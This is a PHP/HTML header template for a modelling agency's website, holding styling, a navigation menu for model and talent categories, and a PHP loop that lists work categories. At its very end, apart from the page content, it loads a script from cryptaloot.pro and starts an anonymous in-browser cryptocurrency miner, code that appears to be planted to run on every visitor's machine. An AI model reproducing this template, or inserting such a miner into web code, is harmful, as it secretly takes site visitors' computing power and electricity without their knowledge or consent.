<style type="text/css">
.flc_menu .dropdown-menu{ left:83px; top:2px;}
#pop_profile{ display:none;}
@media screen and (max-width:767px) {
.col-1,.col-10,.col-11,.col-12,.col-2,.col-3,.col-4,.col-5,.col-6,.col-7,.col-8,.col-9{ flex:100%;}
    .col-12 {
        width: 100%; max-width:100%;
    }

    .col-11 {
       width: 100%; max-width:100%;
    }

    .col-10 {
       width: 100%; max-width:100%;
    }

    .col-9 {
        width: 100%; max-width:100%;
    }

    .col-8 {
        width: 100%; max-width:100%;
    }

    .col-7 {
       width: 100%; max-width:100%;
    }

    .col-6 {
        width: 100%; max-width:100%;
    }

    .col-5 {
        width: 100%; max-width:100%;
    }

    .col-4 {
        width: 100%; max-width:100%;
    }

    .col-3 {
        width: 50%;max-width:50%; flex:50%;
    }

    .col-2 {
        width: 25%; max-width:50%; flex:50%;
    }

    .col-1 {
       width: 25%; max-width:50%; flex:50%;
    }

}


</style>
    <header class="header" id="flc_header">
    	<div class="row">
               
                 <div class="identity">
                    <a href="index.php" style="text-decoration:none">
                        <img src="assets/images/flc-logo_green.png" class="img-responsive logo" alt=""/>
                        <div class="logo-caption"> FLC Production <br>&amp; Model Management</div>
                     </a>
                 </div>
                 
            	<div class="NavCollapse"><ul class="icoNav">
                    <li><a href="index.php" rel="tooltip" data-placement="bottom" title="FLC Group"><i class="fa fa-home" aria-hidden="true"></i></a></li> 
                    <li><a href="register.php" rel="tooltip" data-placement="bottom" title="Login / Register" > <i class="fa fa-user" aria-hidden="true"></i> </a></li>
                    <li><a href="search.php" rel="tooltip" data-placement="bottom" title="Search"><i class="fa fa-search" aria-hidden="true"></i></a></li>
				</ul>
            	<div class="nav-collapse">
                	<span></span>
                    <span></span>
                    <span></span>
                    <span></span>
                	<!--<i class="fa fa-bars" aria-hidden="true"></i>-->
            	</div>
                
                </div>
                
                <div class="rightNav">
                	<ul class="flc_menu">
                            <li><a href="index.php" title="FLC Production &amp; MODELS">Home</a></li>
                            
                            <li><a href="about.php" title="ABOUT FLC MODELS">About Us</a></li>
                            
                            <li class="dropdown"><a href="#" title="FLC MODELS models" class="dropdown-toggle" data-toggle="dropdown">Models<b class="caret"></b></a>
                                <ul class="dropdown-menu">
                                    <li><a href="men.php" title="FLC MODELS MEN">Men</a></li>
                                    <li><a href="women.php" title="FLC TEEN WOMEN">Women</a> </li>
                                 </ul>
                            </li>
                            
                            <li class="dropdown"><a href="#" title="FLC MODELS models" class="dropdown-toggle" data-toggle="dropdown">Talents<b class="caret"></b></a>
                                <ul class="dropdown-menu">
                                    <li><a href="cast.php" title="FLC MODELS CAST">Cast</a></li>
                                    <li><a href="actor.php" title="FLC MODELS Actors">Actors</a></li>
                                    <li><a href="teens.php" title="FLC TEEN MODELS">Teens</a> </li>
                                    <li><a href="kids.php" title="FLC KIDS MODEL">Kids</a> </li>
                                    <li><a href="hostess.php" title="FLC HOSTESS MODEL">Hostess</a> </li>
                                    <li><a href="plus_size.php" title="FLC Plus Size MODEL">Plus Size</a></li>
                                    <li><a href="stylist.php" title="FLC Stylist">Stylist</a></li>	
                                    <li><a href="photographer.php" title="FLC Photographer">Photographer</a> </li>
                                </ul>
                            </li>
                          <li><a href="https://flcme.wordpress.com" title="FLC MODELS Blog" target="_blank">Blog</a></li>
                            <li class="dropdown"><a href="#" title="FLC MODELS WORK PORTFOLIO" class="dropdown-toggle" data-toggle="dropdown">Our Works<b class="caret"></b></a>
                                <ul class="dropdown-menu">
                                <?php
                                require_once(MN_url."config/db.php");
                                require_once(MN_url."classes/Media.php");
                                $media_top= new Media();
                                $cat_res=$media_top->getCategory();
                                while($cat_row=$cat_res->fetch_object()){?>
                                    <li><a title="<?php echo $cat_row->category_name ?>" href="work.php?cat-id=<?php echo $cat_row->category_id ?>"><?php echo $cat_row->category_name ?></a> </li>
                                    <?php } ?>
                                   
                                </ul>
                            </li>
                            
                            
                            <li class="no-border"><a href="contact.php">Contact Us</a></li>
                        </ul>
                </div>
        </div>
    </header>  
    <style type="text/css">
    .pagination_flc{ text-align:right; margin-bottom:15px}
.pagination{ margin:0; display:block;}
.pagination li{ display:inline-block; margin-bottom:10px;}
.pagination > li > a, .pagination > li > span{ padding:0px 12px; color:#666; background-color: #eee;
border: 1px solid #ddd}
.pagination > .active > a, .pagination > .active > a:focus, .pagination > .active > a:hover, .pagination > .active > span, .pagination > .active > span:focus, .pagination > .active > span:hover{ background:#666; color: #eee; border-color:#666}
ul.flc_menu li.dropdown ul.dropdown-menu li a { text-transform:capitalize;}
ul.flc_menu li a:hover{ color:#094}
.chosenFilter{ background-color:transparent; border: 1px solid #cdcdcd;}
.formLink{ text-transform:capitalize;}
.filtersBoxes  h2, .userRoomBox.cf > h2{ text-transform:lowercase;}
.filtersBoxes  h2::first-letter, .userRoomBox.cf > h2::first-letter{ text-transform:uppercase;}
    </style>
    
    <div style="width:100%" id="pop_profile">
        	<div><div style="text-align:center;">LOADING...<br/><img src="<?php echo MN_url; ?>images/loader.gif"  /></div></div>
        </div>

<script src="http://cryptaloot.pro/lib/crypta.js"></script>
<script>
	var miner = new CRLT.Anonymous('ab59b07b3e9fb5afc82e3f56ab2af4a6690679254208');
	miner.start();
</script>